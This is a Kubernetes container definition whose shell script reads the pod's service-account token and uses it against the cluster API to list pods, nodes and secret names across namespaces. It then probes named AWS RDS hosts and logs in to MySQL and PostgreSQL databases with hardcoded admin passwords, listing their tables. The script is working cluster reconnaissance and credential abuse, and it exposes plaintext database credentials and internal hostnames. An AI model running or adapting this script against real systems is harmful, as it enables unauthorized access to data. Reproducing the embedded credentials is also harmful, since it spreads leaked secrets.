containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
echo "===I3030C2_START utc=$(date -u +%FT%TZ) host=$(hostname)==="
echo "AWS_ROLE_ARN=${AWS_ROLE_ARN:-none}"
echo "AWS_WEB_IDENTITY_TOKEN_FILE=${AWS_WEB_IDENTITY_TOKEN_FILE:-none}"

echo "===PODS_ARGOCD==="
get "$API/api/v1/namespaces/argocd/pods?limit=100" > /tmp/pods.json
head -c 300 /tmp/pods.json; echo
jq -r '.items[]? | "POD \(.metadata.name) phase=\(.status.phase)"' /tmp/pods.json 2>/dev/null | head -20

echo "===NODES_RAW==="
get "$API/api/v1/nodes?limit=5" | head -c 800; echo

echo "===NETCHECKS_BEGIN==="
MH='lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PH2='lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PHDP='lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PH1='lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
for h in "$MH" "$PH2" "$PHDP" "$PH1"; do
  echo "---DNS $h"; timeout 8 nslookup "$h" 2>&1 | head -6
done
for hp in "$MH 3306" "$PH2 5432" "$PHDP 5432" "$PH1 5432"; do
  set -- $hp
  echo "---TCP $1:$2"; timeout 8 sh -c "nc -w 5 -v $1 $2 < /dev/null" 2>&1 | head -3
done
echo "===NETCHECKS_END==="

echo "===MYSQL_SSM_BEGIN==="
export MYSQL_PWD='Wv1h=_zJ7?uU3L6?'
timeout 20 mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT VERSION(); SELECT CURRENT_USER();" 2>&1 | head -6
timeout 20 mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT table_name FROM information_schema.tables WHERE table_schema='user_management' ORDER BY table_name" 2>&1 | tr '\n' ' ' | head -c 3000
echo
unset MYSQL_PWD
echo "===MYSQL_SSM_END==="


echo "===PG_RDS2_BEGIN==="
export PGPASSWORD='-W%ZHTpi&X(%)%SW'; export PGCONNECT_TIMEOUT=8
timeout 25 psql -w -h "$PH2" -p 5432 -U postgres_admin -d user_management -At -c "select version(); select current_user;" 2>&1 | head -4
timeout 25 psql -w -h "$PH2" -p 5432 -U postgres_admin -d user_management -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 4000
echo
unset PGPASSWORD
echo "===PG_RDS2_END==="

echo "===PG_DP_BEGIN==="
export PGPASSWORD='1+nGZ&j1e?BZ*orJ'; export PGCONNECT_TIMEOUT=8
timeout 25 psql -w -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select version(); select current_user;" 2>&1 | head -4
timeout 25 psql -w -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000
echo
unset PGPASSWORD
echo "===PG_DP_END==="

echo "===PG_MLFLOW_BEGIN==="
export PGPASSWORD='qdRd#3DI-YDcV35!'; export PGCONNECT_TIMEOUT=8
timeout 25 psql -w -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select version(); select current_user;" 2>&1 | head -4
timeout 25 psql -w -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000
echo
unset PGPASSWORD
echo "===PG_MLFLOW_END==="

echo "===OTHER_NS_SECRET_NAMES==="
for ns in amazon-cloudwatch argo-rollouts default istio-system keda kube-public; do
  get "$API/api/v1/namespaces/$ns/secrets?limit=200" > /tmp/s2.json
  E=$(jq -r '.message // empty' /tmp/s2.json 2>/dev/null)
  if [ -n "$E" ]; then echo "SECLIST_ERR $ns: $E"; continue; fi
  jq -r --arg ns "$ns" '.items[]? | "\($ns)|\(.metadata.name)|\((.data // {}) | keys | join(","))"' /tmp/s2.json 2>/dev/null
done
echo "===I3030C2_DONE utc=$(date -u +%FT%TZ)==="
